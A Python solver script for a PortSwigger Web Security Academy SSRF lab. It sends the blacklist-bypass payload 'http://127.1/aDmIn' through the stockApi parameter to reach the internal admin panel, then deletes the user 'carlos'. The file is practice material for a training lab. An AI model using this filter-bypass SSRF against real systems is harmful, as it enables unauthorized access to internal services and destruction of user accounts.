import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
# author: 0xyf


class SSRF4:
    def __init__(self):
        self.lab_id = "0a6900d204ceb5c98145021d008e0023"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.vuln_url = f"{self.url}/product/stock"

    def execute_request(self, data):
        r = requests.post(
            self.vuln_url,
            data=data,
            allow_redirects=False,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def ssrf(self):
        self.bypass_payload = (
            "http://127.1/aDmIn"  # abbreviated dotted format + case variation
        )
        data = {"stockApi": self.bypass_payload, "storeId": 1}
        r = self.execute_request(data)
        self.get_delete_url(r)

    def get_delete_url(self, r):
        soup = BeautifulSoup(r.text, "html.parser")
        path = [x["href"] for x in soup.find_all("a") if "carlos" in x["href"]][0]
        path = path.split("/admin/")[1]  # remove /admin/ from path
        self.carlos_del_url = f"{self.bypass_payload}/{path}"
        print(f"[+] carlos del url: {self.carlos_del_url}")

    def delete_carlos(self):
        print("[+] deleting carlos")
        data = {"stockApi": self.carlos_del_url, "storeId": 1}
        r = self.execute_request(data)

    def check_solved(self):
        sleep(5)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.ssrf()
        self.delete_carlos()
        self.check_solved()


def main():
    SSRF4().solve()


if __name__ == "__main__":
    main()
